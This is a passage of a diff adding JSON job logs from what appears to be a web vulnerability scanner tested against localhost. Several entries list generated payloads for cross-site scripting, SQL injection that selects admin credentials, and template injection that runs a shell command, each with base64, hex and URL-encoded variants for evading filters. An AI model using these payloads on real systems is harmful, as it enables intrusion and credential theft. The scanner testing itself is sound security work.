+      "job_id": "0a966e31-e242-43f7-b4d2-519e2d1bad02",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977600.766464,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "812466ec-e0b7-4e28-aecb-aeda554c5983",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781979231.5792534,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "1245c682-60fd-4356-b1e5-bc12c162edac",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781979232.3767104,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "afacde64-bbd1-46b3-ab6c-5f7ff4658fb5",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979234.217618,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "a63a7523-07c9-439b-9342-4cc68215c5e0",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979243.8740652,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "af8d3534-76bb-4f91-bd14-5074a39f329c",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781979299.1550627,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "a7578712-1ee9-40c5-8157-c832cc4cd5dd",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979299.9077935,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "4999f9eb-c3e2-4ea4-8b1c-1f9184ce78aa",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781979300.4431937,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "144bd245-da83-4e0b-b989-67363e02a708",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979301.003602,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "37d62767-23e1-4b67-b5e9-cae4d7cdeb0a",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979305.2471416,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9853196a-f364-49c0-a6e8-5cec251e84bb",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979379.5202186,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "99677d53-0c6c-4fdf-bf04-c209012086bf",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979380.0537612,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "bd3ab150-13c1-4a81-803d-4d507f5c5b14",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979382.559262,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "02fc3a90-658d-4728-b64f-ef761e0806a1",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979383.0348027,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9edd791f-ca2a-434c-b382-b3af88444687",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979383.783122,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "bb0a4609-9a8a-4fe6-9c9c-b8944bbd0229",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979384.422062,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "f6513f2b-454c-41f9-947d-f59888be3983",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979393.323534,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ce49cf6d-5911-4cc5-b80d-c8d25c2c3cf9",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979408.5692055,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ccbedec0-1de3-4f00-a9f4-c928beebb942",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979417.6944468,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "537383c4-acce-4906-a36c-a6c90401b728",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979433.2567124,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "efaadd9d-7521-4dcb-97cb-5276c26b8053",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979438.5829444,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "b799c389-2eea-4577-a45e-64bdad899810",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979449.0137265,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "2f3d61af-9f6c-40eb-836e-5ffdc3983195",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979458.3948333,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "a963ede9-9ba9-424a-afd2-3631cbc6d56a",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979461.1932983,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9d0bbd3d-4da5-4955-b3fb-4fcbff891ae7",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781979464.6544032,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "b6062640-6a52-45f3-904c-37c479568c21",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979468.896908,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "aaffdc5e-23fc-4511-8152-ac69f0044800",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979471.3769329,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "51ae025c-25a2-4c42-af82-eb8423fc9f3b",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979471.7425385,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "3f9289df-b2bb-4565-a6ed-7d1d7f7c43aa",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979476.381908,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d5122339-61be-4e4c-9e30-2307f79dde74",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979478.9579465,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "35281bff-f35a-40be-ae0f-25ee56f7c6fe",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979479.4995935,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "7e773352-ed77-4160-93fe-71b3a488c730",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781979479.7168214,
+    "scan_id": "HIVE-V5-d474d1d4e3",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "6d13b723-9fab-438f-a73d-444ae018c794",
       "status": "SUCCESS",
       "target_url": "http://localhost:8080",
       "target_headers": {},
